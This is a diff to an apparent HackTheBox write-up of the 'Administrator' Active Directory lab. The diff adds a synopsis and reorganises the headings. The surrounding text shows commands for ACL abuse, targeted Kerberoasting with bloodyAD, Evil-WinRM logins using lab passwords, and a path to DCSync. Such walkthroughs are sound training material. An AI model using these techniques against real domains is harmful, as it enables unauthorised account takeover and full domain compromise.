@@ -8,6 +8,8 @@ categories: ['HackTheBox', 'Windows', 'Active-Directory']
 
 ![](/assets/images/headers/Administrator.png)
 
+# Synopsis
+
 Administrator is a medium-difficulty Windows machine designed around a complete domain compromise scenario, where credentials for a low-privileged user are provided. To gain access to the `michael` account, ACLs (Access Control Lists) over privileged objects are enumerated, leading us to discover that the user `olivia` has `GenericAll` permissions over `michael`, allowing us to reset his password. With access as `michael`, it is revealed that he can force a password change on the user `benjamin`, whose password is reset. This grants access to `FTP` where a `backup.psafe3` file is discovered, cracked, and reveals credentials for several users. These credentials are sprayed across the domain, revealing valid credentials for the user `emily`. Further enumeration shows that `emily` has `GenericWrite` permissions over the user `ethan`, allowing us to perform a targeted Kerberoasting attack. The recovered hash is cracked and reveals valid credentials for `ethan`, who is found to have `DCSync` rights ultimately allowing retrieval of the `Administrator` account hash and full domain compromise.
 
 As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: 
@@ -16,7 +18,7 @@ Username: Olivia
 Password: ichliebedich
 ```
 
-# Reconnaissance
+## Reconnaissance
 From our initial nmap scan, we see that we are dealing with a Windows Domain Controller. Notice that port 21 (FTP) is also open.
 
 ```console
@@ -60,6 +62,8 @@ $ nxc winrm 10.10.11.42 -u 'olivia' -p 'ichliebedich'
 WINRM       10.10.11.42     5985   DC               [+] administrator.htb\olivia:ichliebedich (Pwn3d!)
 ```
 
+### BloodHound Enumeration
+
 We can either logon to the DC with Evil-WinRM and run SharpHound to collect information for BloodHound or run the BloodHound.py script.
 
 ```console
@@ -87,7 +91,7 @@ We now start BloodHound CE and import the zip file. After looking through the da
 
 ![](/assets/images/writeups/administrator/BH-path.png)
 
-# User
+## User
 As our starting account, we have the `GenericAll` permissions to the user `michael`. There are several ways we can abuse this privilege: we can either change the user's password or set an SPN on the account and perform a targeted Kerberoasting attack. Let's go for the latter as for the next user we already have to force a password change.
 
 ```console
@@ -103,6 +107,8 @@ fake/dc.administrator.htb  michael  CN=Remote Management Users,CN=Builtin,DC=adm
 [-] CCache file is not found. Skipping...
 [-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
 ```
+
+### Fixing Clock Skew
 
 If you get a `Clock skew too great` error just like me, just run this command that spawns a bash shell with the clock synced to the DC:
 ```console
@@ -145,6 +151,7 @@ Password:
 Remote system type is Windows_NT.
 ```
 
+### Cracking PSafe Database Credentials
 Bingo! We are logged in on the FTP share and find a `psafe3` backup file.
 
 ```console
@@ -189,12 +196,15 @@ $ evil-winrm -i administrator.htb -u emily -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb"
 *Evil-WinRM* PS C:\Users\emily\Desktop> cat user.txt
 ```
 
-# Root
+## Root
 Emily also has `GenericWrite` access to `Ethan`. We can therefore perform the same attacks as before and perform a targeted Kerberoast attack. 
 
 ![](/assets/images/writeups/administrator/BH-DCSync.png)
 
-From the BloodHound data we see that `ethan` has the `DS-Replication-Get-Changes` and the `DS-Replication-Get-Changes-All` permission on the domain `ADMINISTRATOR.HTB`. We can perform a DCSync attack after compromsing his account. Let's proceed!
+From the BloodHound data we see that `ethan` has the `DS-Replication-Get-Changes` and the `DS-Replication-Get-Changes-All` permission on the domain `ADMINISTRATOR.HTB`. 
+
+### DCSync
+We can perform a DCSync attack after compromsing his account. Let's proceed!
 
 ```console
 $ bloodyAD --host 10.10.11.42 -d administrator.htb -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' set object ethan servicePrincipalName -v 'fake2/dc.administrator.htb'
